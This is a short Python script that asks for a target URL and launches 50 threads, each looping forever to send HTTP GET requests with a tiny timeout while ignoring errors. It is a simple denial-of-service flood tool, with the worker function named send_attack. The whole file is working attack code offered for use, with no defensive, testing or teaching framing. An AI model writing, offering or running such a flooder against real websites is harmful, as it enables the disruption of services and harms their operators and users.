import requests
import threading

# Function to send GET request without waiting for response
def send_attack(target):
    while True:
        try:
            requests.get(target, timeout=0.1)  # Timeout to avoid waiting too long
        except requests.exceptions.RequestException:
            pass  # Ignore any request exceptions

# Get target URL from user
target = input("Enter target URL: ")

# Create threads to send requests concurrently (non-blocking)
threads = []
for _ in range(50):  # Number of threads (can be adjusted)
    thread = threading.Thread(target=send_attack, args=(target,))
    threads.append(thread)
    thread.start()

# Wait for all threads to finish (optional)
for thread in threads:
    thread.join()

